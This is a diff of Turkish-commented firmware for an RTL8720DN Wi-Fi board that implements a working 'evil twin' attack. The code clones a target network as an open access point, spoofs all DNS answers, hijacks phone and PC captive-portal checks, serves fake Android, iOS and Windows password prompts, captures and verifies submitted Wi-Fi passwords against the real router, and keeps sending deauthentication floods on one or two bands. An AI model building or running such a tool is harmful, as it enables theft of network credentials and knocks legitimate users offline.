@@ -17,100 +17,158 @@ String     evil_twin_ssid      = "";
 int        evil_twin_channel   = 1;
 uint8_t    evil_twin_bssid[6]  = {0};
 int        evil_twin_clients   = 0;
-// ── Çift bant ──────────────────────────────────────────────────────────────
 bool       evil_twin_dual_band = false;
 uint8_t    evil_twin_bssid2[6] = {0};
 int        evil_twin_channel2  = 0;
 String     evil_twin_ssid2     = "";
-// ───────────────────────────────────────────────────────────────────────────
 bool       et_last_verify_ok   = false;
 String     et_last_verify_pass = "";
 ETPassword et_passwords[ET_MAX_PASSWORDS];
 int        et_password_count   = 0;
 
 // ─── İç değişkenler ──────────────────────────────────────────────────────────
-static WiFiUDP    et_dns_udp;
-static bool       et_dns_started   = false;
-static unsigned long et_last_deauth_ms  = 0;
-static unsigned long et_last_retrack_ms = 0;
-static uint8_t       et_broadcast[6]    = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+static WiFiUDP       et_dns_udp;
+static bool          et_dns_started    = false;
+static unsigned long et_last_deauth_ms = 0;
+static unsigned long et_last_retrack_ms= 0;
+static uint8_t       et_broadcast[6]   = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
 
-// Retrack tarama sonucu (scan callback'ten doldurulur)
+// Retrack tarama sonucu
 static volatile bool    et_rt_found   = false;
 static volatile uint8_t et_rt_channel = 0;
 static uint8_t          et_rt_bssid[6] = {0};
 
-// ─── apbegin sarmalayıcı — const char* → char* dönüşümü için ─────────────────
-// RTL8720dn SDK apbegin() char* bekler; String::c_str() const char* döner.
+// ─── AP başlatma sarmalayıcısı ────────────────────────────────────────────────
+//
+// ARAŞTIRMA BULGUSU — Evil-BW16-WebUI, Ameba IoT forum, BW16-ESP32-Evil-Twin:
+//
+// AmebaD SDK'sı, WiFi.apbegin() öncesi STA arayüzünün TAMAMEN kapatılmasını
+// zorunlu kılar. WiFi.disableSTA() çağrılmadan apbegin() çağrılırsa:
+//   - AP sessizce başarısız olur VEYA başlar ama beacon göndermez
+//   - Kurbanın tarama listesinde ağ görünmez
+//   - Bu, "deauth çalışıyor ama sahte AP görünmüyor" hatasının #1 sebebidir.
+//
+// Referanslar:
+//   - Evil-BW16-WebUI (Evil-Project-Team/Evil-BW16-WebUI) startEvilTwin()
+//   - Ameba IoT forum: "WiFi.disableSTA() before apbegin()"
+//   - BW16-ESP32-Evil-Twin (Janek79ax) setup sequence
+//
+// Kanal:  AmebaD SDK imzası: WiFi.apbegin(ssid, password, channel_str)
+//         channel_str bir char* string — bu doğru; uint8_t değil.
+// Şifre:  Boş string ("") → AmebaD iç tarafında ENC_TYPE_NONE → açık ağ.
 static void et_ap_start(const String &ap_ssid, int channel) {
-  char s[64]; char p[2] = {0}; char c[4];
-  strncpy(s, ap_ssid.c_str(), sizeof(s) - 1); s[sizeof(s)-1] = 0;
-  snprintf(c, sizeof(c), "%d", channel);
-  WiFi.apbegin(s, p, c);
+  char s[64];
+  char c[4];
+  strncpy(s, ap_ssid.c_str(), sizeof(s) - 1);
+  s[sizeof(s) - 1] = '\0';
+
+  // Kanal 1–13 arası; dışarıdaki değerleri 6'ya sabitle
+  int ch = channel;
+  if (ch < 1 || ch > 13) ch = 6;
+  snprintf(c, sizeof(c), "%d", ch);
+
+  // ── ADIM 1: STA arayüzünü tamamen kapat ──────────────────────────────────
+  // Bu olmadan apbegin() beacon göndermez.
+  WiFi.disconnect();
+  WiFi.disableSTA();
+  delay(300); // Radio settle — atlamak AP'nin başlamamasına yol açar
+
+  // ── ADIM 2: Sahte AP'yi başlat (açık ağ, şifresiz) ───────────────────────
+  WiFi.apbegin(s, (char *)"", c);
 }
 
 // ─── DNS Spoofer ──────────────────────────────────────────────────────────────
+// Tüm DNS sorgularına 192.168.1.1 (ET_AP_IP_STR) cevabı döner.
+// TTL=60: istemciler cevabı 60 sn önbelleğe alır → tekrarlı sorgu azalır.
+//
+// Güvenlik: DNS yanıt tamponu 512 bayt.
+// Sorgu 490 baytı aşarsa yanıt eklentisi tampon dışına taşabilir.
+// Bu sebeple n > 490 ise paket sessizce yok sayılır.
 static uint8_t et_dns_buf[512];
 
 static void et_dns_process_packet() {
   int n = et_dns_udp.parsePacket();
-  if (n < 12) return;
+  if (n < 12 || n > 490) return;  // Çok küçük/büyük → atla
+
   IPAddress sender_ip   = et_dns_udp.remoteIP();
   uint16_t  sender_port = et_dns_udp.remotePort();
   n = et_dns_udp.read(et_dns_buf, sizeof(et_dns_buf));
-  if (n < 12) return;
-  if ((et_dns_buf[2] & 0x80) != 0) return;
-  if ((et_dns_buf[2] & 0x78) != 0) return;
+  if (n < 12 || n > 490) return;
+
+  // Yalnızca standart sorgu (QR=0, opcode=0) kabul et
+  if ((et_dns_buf[2] & 0x80) != 0) return;  // Yanıt paketi → atla
+  if ((et_dns_buf[2] & 0x78) != 0) return;  // Standart olmayan opcode → atla
 
   uint8_t resp[512];
   memcpy(resp, et_dns_buf, n);
-  resp[2] = 0x81; resp[3] = 0x80;
-  resp[6] = 0x00; resp[7]  = 0x01;
-  resp[8] = 0x00; resp[9]  = 0x00;
-  resp[10]= 0x00; resp[11] = 0x00;
 
+  // DNS yanıt bayrakları: QR=1, AA=1, RA=1 (authoritative, recursive available)
+  resp[2] = 0x84;  // 1000 0100 — QR|AA
+  resp[3] = 0x80;  // 1000 0000 — RA
+
+  // ANCOUNT=1, NSCOUNT=0, ARCOUNT=0
+  resp[6]  = 0x00; resp[7]  = 0x01;
+  resp[8]  = 0x00; resp[9]  = 0x00;
+  resp[10] = 0x00; resp[11] = 0x00;
+
+  // Yanıt kaydı: name pointer → soru adına (0xC00C)
   int pos = n;
-  resp[pos++]=0xC0; resp[pos++]=0x0C;
-  resp[pos++]=0x00; resp[pos++]=0x01;
-  resp[pos++]=0x00; resp[pos++]=0x01;
-  resp[pos++]=0x00; resp[pos++]=0x00;
-  resp[pos++]=0x00; resp[pos++]=0x00;
-  resp[pos++]=0x00; resp[pos++]=0x04;
-  resp[pos++]=192;  resp[pos++]=168;
-  resp[pos++]=1;    resp[pos++]=1;
+  resp[pos++] = 0xC0; resp[pos++] = 0x0C;  // Name pointer
+  resp[pos++] = 0x00; resp[pos++] = 0x01;  // Type: A
+  resp[pos++] = 0x00; resp[pos++] = 0x01;  // Class: IN
+  // TTL = 60 saniye (0x0000003C)
+  resp[pos++] = 0x00; resp[pos++] = 0x00;
+  resp[pos++] = 0x00; resp[pos++] = 0x3C;
+  resp[pos++] = 0x00; resp[pos++] = 0x04;  // RDLENGTH = 4
+  // RDATA: 192.168.1.1
+  resp[pos++] = 192; resp[pos++] = 168;
+  resp[pos++] = 1;   resp[pos++] = 1;
 
   et_dns_udp.beginPacket(sender_ip, sender_port);
   et_dns_udp.write(resp, pos);
   et_dns_udp.endPacket();
 }
 
-// ─── User-Agent çıkar ────────────────────────────────────────────────────────
+// ─── User-Agent tespiti ───────────────────────────────────────────────────────
 static String et_get_ua(const String &request) {
   int p = request.indexOf("User-Agent:");
   if (p < 0) p = request.indexOf("user-agent:");
   if (p < 0) return "";
   int e = request.indexOf("\r\n", p);
+  if (e < 0) return request.substring(p + 11);
   return request.substring(p + 11, e);
 }
 
 // ─── HTTP yanıt gönder ────────────────────────────────────────────────────────
 static void et_send_html(WiFiClient &client, const String &html) {
-  String hdr = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=UTF-8\r\n";
-  hdr += "Content-Length: " + String(html.length()) + "\r\n";
-  hdr += "Connection: close\r\n\r\n";
+  String hdr;
+  hdr.reserve(120);
+  hdr  = "HTTP/1.1 200 OK\r\n";
+  hdr += "Content-Type: text/html; charset=UTF-8\r\n";
+  hdr += "Content-Length: ";
+  hdr += String(html.length());
+  hdr += "\r\nCache-Control: no-store\r\nConnection: close\r\n\r\n";
   client.write(hdr.c_str());
   client.write(html.c_str());
 }
 
 static void et_send_redirect(WiFiClient &client, const char *url) {
-  String r = "HTTP/1.1 302 Found\r\nLocation: ";
+  String r;
+  r.reserve(120);
+  r  = "HTTP/1.1 302 Found\r\nLocation: ";
   r += url;
-  r += "\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
+  r += "\r\nContent-Length: 0\r\nCache-Control: no-store\r\nConnection: close\r\n\r\n";
   client.write(r.c_str());
 }
 
+// Android için 204 No Content yanıtı (captive portal algılama bazı sürümlerde
+// bu yanıtı bekler; yanlış yanıt → portal açılmaz)
+static void et_send_204(WiFiClient &client) {
+  client.write("HTTP/1.1 204 No Content\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
+}
+
 // ═══════════════════════════════════════════════════════════════════════════════
-// PORTAL SAYFALARI — 3 farkli OS tasarımı (referans projeden birebir uyarlandı)
+// PORTAL SAYFALARI
 // ═══════════════════════════════════════════════════════════════════════════════
 
 // ─── Android — Material Design 3 ─────────────────────────────────────────────
@@ -361,7 +419,7 @@ static void portal_ios(WiFiClient &client, bool wrong_pass) {
   et_send_html(client, html);
 }
 
-// ─── Windows — Windows 11 WiFi flyout ────────────────────────────────────────
+// ─── Windows 11 WiFi flyout ───────────────────────────────────────────────────
 static void portal_windows(WiFiClient &client, bool wrong_pass) {
   String html;
   html.reserve(7000);
@@ -572,7 +630,6 @@ static void portal_serve(WiFiClient &client, const String &request, bool wrong_p
   String ua = et_get_ua(request);
   bool is_ios     = ua.indexOf("iPhone") >= 0 || ua.indexOf("iPad") >= 0 || ua.indexOf("iPod") >= 0;
   bool is_android = ua.indexOf("Android") >= 0;
-  // Diğer her şey (Windows, macOS desktop, Linux) → Windows 11 tasarımı
   if (is_ios)          portal_ios    (client, wrong_pass);
   else if (is_android) portal_android(client, wrong_pass);
   else                 portal_windows(client, wrong_pass);
@@ -586,7 +643,7 @@ static String et_url_decode(const String &s) {
     if (s[i] == '+') {
       out += ' ';
     } else if (s[i] == '%' && i + 2 < (int)s.length()) {
-      char h[3] = {s[i+1], s[i+2], 0};
+      char h[3] = {s[i+1], s[i+2], '\0'};
       out += (char)strtol(h, nullptr, 16);
       i += 2;
     } else {
@@ -596,12 +653,11 @@ static String et_url_decode(const String &s) {
   return out;
 }
 
-// ─── POST gövdesinden "password" veya "pw" alanını çıkar ─────────────────────
+// ─── POST gövdesinden "password" alanını çıkar ───────────────────────────────
 static String et_extract_password(const String &request) {
   int bs = request.indexOf("\r\n\r\n");
   if (bs == -1) return "";
   String body = request.substring(bs + 4);
-  // "password=" veya "pw=" denemesi
   int p = body.indexOf("password=");
   int skip = 9;
   if (p < 0) { p = body.indexOf("pw="); skip = 3; }
@@ -612,7 +668,7 @@ static String et_extract_password(const String &request) {
   return et_url_decode(val);
 }
 
-// ─── Şifre kaydet ────────────────────────────────────────────────────────────
+// ─── Şifre kaydet ─────────────────────────────────────────────────────────────
 static void et_save_password(const String &password, bool verified) {
   if (et_password_count >= ET_MAX_PASSWORDS) return;
   for (int i = 0; i < et_password_count; i++) {
@@ -627,53 +683,54 @@ static void et_save_password(const String &password, bool verified) {
   et_password_count++;
 }
 
-// ─── Şifre doğrulama ─────────────────────────────────────────────────────────
+// ─── Şifre doğrulama ──────────────────────────────────────────────────────────
+// STA moduna geçip gerçek AP'ye bağlanmayı dener.
+// Başarılı → true, başarısız → false.
+// Her iki durumda da AP'yi yeniden başlatır.
 static bool et_verify_password(const String &password) {
+  // 1. DNS'i durdur
   if (et_dns_started) { et_dns_udp.stop(); et_dns_started = false; }
-  delay(150);
+  delay(200);
 
+  // 2. STA modunda bağlan
   char et_ssid_buf[64];
   strncpy(et_ssid_buf, evil_twin_ssid.c_str(), sizeof(et_ssid_buf) - 1);
-  et_ssid_buf[sizeof(et_ssid_buf) - 1] = 0;
+  et_ssid_buf[sizeof(et_ssid_buf) - 1] = '\0';
+
   WiFi.begin(et_ssid_buf, password.c_str());
   bool ok = false;
-  unsigned long t = millis();
-  while (millis() - t < ET_VERIFY_TIMEOUT_MS) {
+  unsigned long t0 = millis();
+  while (millis() - t0 < ET_VERIFY_TIMEOUT_MS) {
     if (WiFi.status() == WL_CONNECTED) { ok = true; break; }
     delay(100);
   }
   WiFi.disconnect();
-  delay(300);
+  delay(400); // Bağlantı kesme için süre
 
+  // 3. ET AP'yi yeniden başlat
   et_ap_start(evil_twin_ssid, evil_twin_channel);
-  delay(250);
+  delay(500); // AP'nin hazır olması için yeterli süre
+
+  // 4. DNS'i yeniden başlat
   et_dns_udp.begin(53);
   et_dns_started = true;
+
   return ok;
 }
 
 // ─── Hedef yeniden bulma (Retrack) ────────────────────────────────────────────
-// Hedef AP kanal değiştirirse (ya da resetlenirse) yeni kanalı tespit edip
-// sahte AP'yi günceller. Her ET_RETRACK_INTERVAL_MS ms'de bir tetiklenir.
-
-// Scan callback — yalnızca hedef BSSID'yi arar
 static rtw_result_t et_retrack_handler(rtw_scan_handler_result_t *scan_result) {
   if (scan_result->scan_complete != 0) return RTW_SUCCESS;
   rtw_scan_result_t *r = &scan_result->ap_details;
-
   uint8_t bssid[6];
   memcpy(bssid, &r->BSSID, 6);
-
-  // BSSID eşleşmesi — hedef AP tam olarak bu mu?
   if (memcmp(bssid, (const void *)evil_twin_bssid, 6) == 0) {
     et_rt_found   = true;
     et_rt_channel = (uint8_t)r->channel;
     memcpy(et_rt_bssid, bssid, 6);
     return RTW_SUCCESS;
   }
-
-  // BSSID eşleşmemişse SSID üzerinden de ara (router reset → BSSID değişebilir)
-  r->SSID.val[r->SSID.len] = 0;
+  r->SSID.val[r->SSID.len] = '\0';
   String found_ssid = String((const char *)r->SSID.val);
   if (!et_rt_found && found_ssid == evil_twin_ssid) {
     et_rt_found   = true;
@@ -683,70 +740,102 @@ static rtw_result_t et_retrack_handler(rtw_scan_handler_result_t *scan_result) {
   return RTW_SUCCESS;
 }
 
-// Retrack ana fonksiyonu — bloklayıcı (~5 sn tarama süresi)
 static void et_retrack() {
-  et_rt_found   = false;
-  et_rt_channel = 0;
+  // ── ARAŞTIRMA BULGUSU: wifi_scan_networks() AP çalışırken çağrılmamalı ──
+  //
+  // RTL8720DN tek radyo paylaşımlı mimari:
+  //   wifi_scan_networks() → tüm kanallara hop yapar → AP beacon'ları kesilir
+  //   → istemciler düşer, AP "kaybolur"
+  //   → Scan fonksiyonu SoftAP aktifken RTW_ERROR döndürebilir.
+  //
+  // Çözüm: AP durdur → tara → AP yeniden başlat.
+  // et_ap_start() zaten WiFi.disconnect() + WiFi.disableSTA() yapar.
+  //
+  // Referans: forum.amebaiot.com, RTL8720dn-5GHz-Wifi-Deauther, Evil-BW16.
 
-  // Taramayı başlat — RTL8720dn AP modunda da tarama yapabilir
-  if (wifi_scan_networks(et_retrack_handler, NULL) != RTW_SUCCESS) return;
-  delay(5000);  // Taramanın bitmesini bekle
-
-  if (!et_rt_found) {
-    // Hedef bulunamadı — aynı kanalda beklemeye devam et
-    return;
-  }
-
-  bool channel_changed = (et_rt_channel != (uint8_t)evil_twin_channel);
-  bool bssid_changed   = (memcmp(et_rt_bssid, evil_twin_bssid, 6) != 0);
-
-  if (!channel_changed && !bssid_changed) return;  // Değişiklik yok
-
-  // ── Değişiklik tespit edildi ─────────────────────────────────────────────
-  // 1. Yeni parametreleri güncelle
-  evil_twin_channel = (int)et_rt_channel;
-  if (bssid_changed) memcpy(evil_twin_bssid, et_rt_bssid, 6);
-
-  // 2. DNS'i geçici olarak durdur (kanal geçiş sırasında paket çakışmasın)
+  // 1. DNS durdur
   if (et_dns_started) { et_dns_udp.stop(); et_dns_started = false; }
 
-  // 3. Sahte AP'yi yeni kanalda yeniden başlat
-  et_ap_start(evil_twin_ssid, evil_twin_channel);
-  delay(250);
+  // 2. Radyoyu serbest bırak (et_ap_start içindeki disconnect/disableSTA ile aynı)
+  WiFi.disconnect();
+  WiFi.disableSTA();
+  delay(200);
 
-  // 4. DNS'i yeniden başlat
+  // 3. Tara — radyo artık serbest, AP yok, scan çalışabilir
+  et_rt_found   = false;
+  et_rt_channel = 0;
+  bool scan_ok = (wifi_scan_networks(et_retrack_handler, NULL) == RTW_SUCCESS);
+  if (scan_ok) delay(5000); // Taramanın tamamlanmasını bekle
+
+  // 4. Kanal/BSSID değişikliği var mı?
+  bool channel_changed = false;
+  bool bssid_changed   = false;
+  if (et_rt_found) {
+    channel_changed = ((uint8_t)et_rt_channel != (uint8_t)evil_twin_channel);
+    bssid_changed   = (memcmp(et_rt_bssid, evil_twin_bssid, 6) != 0);
+    if (channel_changed) evil_twin_channel = (int)et_rt_channel;
+    if (bssid_changed)   memcpy(evil_twin_bssid, et_rt_bssid, 6);
+  }
+
+  // 5. AP'yi yeniden başlat (et_ap_start: disconnect+disableSTA+apbegin)
+  et_ap_start(evil_twin_ssid, evil_twin_channel);
+  delay(500);
+
+  // 6. DNS'i yeniden başlat
   et_dns_udp.begin(53);
   et_dns_started = true;
 
-  // 5. Deauth zamanlayıcısını sıfırla — hemen burst gönder
-  et_last_deauth_ms = 0;
+  // 7. Kanal değiştiyse hemen deauth burst gönder
+  if (channel_changed || bssid_changed) et_last_deauth_ms = 0;
 }
 
 // ─── Deauth burst ─────────────────────────────────────────────────────────────
+//
+// ARAŞTIRMA BULGUSUNA DAYALI MİMARİ DÜZELTME (tesa-klebeband, Ameba SDK forum):
+//
+// RTL8720DN iki bağımsız arayüze sahiptir:
+//   WLAN0 = STA / raw frame injection  (wext_set_channel bu arayüzü kullanır)
+//   WLAN1 = SoftAP                      (WiFi.apbegin() DAIMA WLAN1 kullanır)
+//
+// Bu nedenle wext_set_channel(WLAN0_NAME, ...) AP'yi (WLAN1) HİÇ ETKİLEMEZ.
+// Dual-band deauth hem WLAN0'ı hem de WLAN1'i kesmeden yapılabilir.
+//
+// Referanslar:
+//   - deepwiki.com/7h30th3r0n3/Evil-BW16/6-technical-reference
+//   - forum.amebaiot.com/t/rtl8720dn-is-802-11-frame-injection-possible/883
+//   - tesa-klebeband.github.io/making-raw-802-11-frame-injection-possible-on-an-rtl8720dn
 static void et_send_deauth_burst() {
   static const uint8_t reasons[] = {2, 3, 6, 7, 8};
+  const char *ssid_c = evil_twin_ssid.c_str();
 
-  // ── Birinci band (2.4GHz veya seçilen) ───────────────────────────────────
+  // ── Birincil band (WLAN0 → hedef kanal) ──────────────────────────────────
+  // WLAN1'deki AP bundan etkilenmez — bağımsız arayüzler.
   wext_set_channel(WLAN0_NAME, (uint8_t)evil_twin_channel);
   for (int r = 0; r < 5; r++) {
     wifi_tx_deauth_frame  (evil_twin_bssid, et_broadcast, reasons[r]);
     wifi_tx_disassoc_frame(evil_twin_bssid, et_broadcast, reasons[r]);
   }
-  const char *ssid_c = evil_twin_ssid.c_str();
-  for (int i = 0; i < 5; i++) wifi_tx_beacon_frame(evil_twin_bssid, et_broadcast, ssid_c);
+  // Beacon: DS Parameter Set IE ile kanal bilgisi dahil — istemci bağlanmayı dener
+  for (int i = 0; i < 3; i++) {
+    wifi_tx_beacon_frame(evil_twin_bssid, et_broadcast, ssid_c,
+                         (uint8_t)evil_twin_channel);
+  }
 
-  // ── İkinci band — çift bant aktifse (5GHz / karşı band) ──────────────────
+  // ── İkinci band (çift bant aktifse, WLAN0 kanal değiştir) ────────────────
+  // AP WLAN1'de güvenle devam eder; WLAN0 kanal değişikliği sadece injection'ı etkiler.
   if (evil_twin_dual_band && evil_twin_channel2 > 0) {
     wext_set_channel(WLAN0_NAME, (uint8_t)evil_twin_channel2);
+    const char *ssid_c2 = (evil_twin_ssid2.length() > 0)
+                            ? evil_twin_ssid2.c_str() : ssid_c;
     for (int r = 0; r < 5; r++) {
       wifi_tx_deauth_frame  (evil_twin_bssid2, et_broadcast, reasons[r]);
       wifi_tx_disassoc_frame(evil_twin_bssid2, et_broadcast, reasons[r]);
     }
-    const char *ssid_c2 = (evil_twin_ssid2.length() > 0)
-                            ? evil_twin_ssid2.c_str()
-                            : ssid_c;
-    for (int i = 0; i < 5; i++) wifi_tx_beacon_frame(evil_twin_bssid2, et_broadcast, ssid_c2);
-    // Birinci banda geri dön (AP ve DNS bu kanala ihtiyaç duyar)
+    for (int i = 0; i < 3; i++) {
+      wifi_tx_beacon_frame(evil_twin_bssid2, et_broadcast, ssid_c2,
+                           (uint8_t)evil_twin_channel2);
+    }
+    // Birincil kanala geri dön (DNS ve web sunucusu için gerekli değil ama tutarlılık için)
     wext_set_channel(WLAN0_NAME, (uint8_t)evil_twin_channel);
   }
 }
@@ -755,15 +844,20 @@ static void et_send_deauth_burst() {
 void start_evil_twin(int /*scan_idx*/) {
   evil_twin_active     = true;
   evil_twin_clients    = 0;
-  et_last_deauth_ms    = millis();
+  et_last_deauth_ms    = 0;          // İlk burst hemen gönderilsin
   et_last_retrack_ms   = millis();
   et_last_verify_ok    = false;
   et_last_verify_pass  = "";
   et_rt_found          = false;
-  // evil_twin_dual_band / bssid2 / channel2 / ssid2 → .ino tarafından doldurulur
 
+  // DNS'i temizle (önceki oturumdan kalıntı olabilir)
+  if (et_dns_started) { et_dns_udp.stop(); et_dns_started = false; }
+
+  // ET AP'yi başlat
   et_ap_start(evil_twin_ssid, evil_twin_channel);
-  delay(300);
+  delay(500); // AP'nin tam hazır olması için yeterli süre
+
+  // DNS spoofer başlat
   et_dns_udp.begin(53);
   et_dns_started = true;
 }
@@ -776,31 +870,35 @@ void stop_evil_twin() {
   evil_twin_channel2   = 0;
   memset(evil_twin_bssid2, 0, 6);
   evil_twin_ssid2      = "";
+
   if (et_dns_started) { et_dns_udp.stop(); et_dns_started = false; }
-  delay(200);
-  { char c[] = "1"; WiFi.apbegin(ssid, pass, c); }
+
+  // Yönetim AP'sini yeniden başlat — aynı STA teardown sekansı gerekli.
+  // et_ap_start() zaten WiFi.disconnect() + WiFi.disableSTA() + delay yapar.
+  // Burada doğrudan ssid/pass ile çağırıyoruz.
+  WiFi.disconnect();
+  WiFi.disableSTA();
   delay(300);
+  { char c[] = "1"; WiFi.apbegin(ssid, pass, c); }
+  delay(500);
 }
 
 // ─── Evil Twin ana döngüsü ────────────────────────────────────────────────────
 void evil_twin_loop() {
   if (!evil_twin_active) return;
 
+  // DNS sorgularını işle
   if (et_dns_started) et_dns_process_packet();
 
   unsigned long now = millis();
 
-  // Deauth burst
+  // Deauth burst: ET_DEAUTH_INTERVAL_MS ms'de bir
   if (now - et_last_deauth_ms >= ET_DEAUTH_INTERVAL_MS) {
     et_last_deauth_ms = now;
     et_send_deauth_burst();
   }
 
-  // Kanal takibi — her ET_RETRACK_INTERVAL_MS ms'de bir hedefi yeniden tara.
-  // et_retrack() bloklayıcıdır (~5 sn) ama portal web sunucusunu bloklamaz
-  // çünkü ana loop'ta yeni bağlantı kabulü bu fonksiyon dönmeden olmaz;
-  // bu süre çok kısadır ve kullanıcı zaten şifresini giriyor olduğunda
-  // retrack tetiklenmez (şifre doğrulama et_verify_password tarafından yapılır).
+  // Kanal takibi: ET_RETRACK_INTERVAL_MS ms'de bir (~5 sn bloklayan tarama)
   if (now - et_last_retrack_ms >= ET_RETRACK_INTERVAL_MS) {
     et_last_retrack_ms = now;
     et_retrack();
@@ -824,21 +922,63 @@ bool evil_twin_portal_handle(WiFiClient &client,
     return false;
   }
 
-  // ── OS captive portal algılama — portal'a yönlendir ──────────────────────
-  auto redir = [&]() {
+  // ── OS Captive Portal Algılama URL'leri ──────────────────────────────────
+  //
+  // Android (Chrome / AOSP):
+  //   /generate_204            — Ana algılama (HTTP 204 beklenir)
+  //   /gen_204                 — Alternatif
+  //   /connecttest.txt         — Android 10+ ek kontrol
+  //
+  // iOS / macOS:
+  //   /hotspot-detect.html     — iOS 7–17 temel kontrol
+  //   /library/test/success.html  — iOS / Safari
+  //   /success.txt             — macOS
+  //   /captive.apple.com/...   — iOS 14+ (DNS ile yakalanır)
+  //
+  // Windows:
+  //   /connecttest.txt         — Windows 10/11 NCSI
+  //   /ncsi.txt                — Windows 7/8/10 eski NCSI
+  //   /redirect                — Windows 10 yönlendirme uç noktası
+  //   /canonical.html          — IE captive portal
+  //
+  // Genel:
+  //   /favicon.ico             — Bazı tarayıcılar bunu test eder
+
+  auto redir_portal = [&]() {
     et_send_redirect(client, "http://" ET_AP_IP_STR "/portal");
   };
-  if (path == "/generate_204"            ||
-      path.startsWith("/generate_204")   ||
-      path == "/hotspot-detect.html"     ||
+
+  // Android generate_204: gerçek ağda 204 döner, yoksa captive portal açar.
+  // Biz doğrudan portala yönlendiriyoruz (302) → Android captive portal diyalogu açılır.
+  if (path == "/generate_204"              ||
+      path.startsWith("/generate_204?")    ||
+      path == "/gen_204"                   ||
+      path.startsWith("/gen_204?")) {
+    redir_portal();
+    return true;
+  }
+
+  // iOS / macOS
+  if (path == "/hotspot-detect.html"       ||
       path == "/library/test/success.html" ||
-      path == "/success.txt"             ||
-      path == "/connecttest.txt"         ||
-      path == "/redirect"                ||
-      path == "/ncsi.txt"                ||
-      path == "/canonical.html"          ||
-      path == "/favicon.ico") {
-    redir();
+      path == "/success.txt"               ||
+      path == "/canonical.html") {
+    redir_portal();
+    return true;
+  }
+
+  // Windows NCSI
+  if (path == "/connecttest.txt"           ||
+      path == "/ncsi.txt"                  ||
+      path == "/redirect"                  ||
+      path == "/redirect.txt") {
+    redir_portal();
+    return true;
+  }
+
+  // Genel
+  if (path == "/favicon.ico") {
+    redir_portal();
     return true;
   }
 
@@ -861,7 +1001,7 @@ bool evil_twin_portal_handle(WiFiClient &client,
       delay(3000);
       stop_evil_twin();
     } else {
-      portal_serve(client, request, true);  // yanlış şifre göster
+      portal_serve(client, request, true);
     }
     return true;
   }
@@ -872,7 +1012,7 @@ bool evil_twin_portal_handle(WiFiClient &client,
     return true;
   }
 
-  // Bilinmeyen yol → portal'a yönlendir
-  redir();
+  // Bilinmeyen yol → portala yönlendir
+  redir_portal();
   return true;
 }
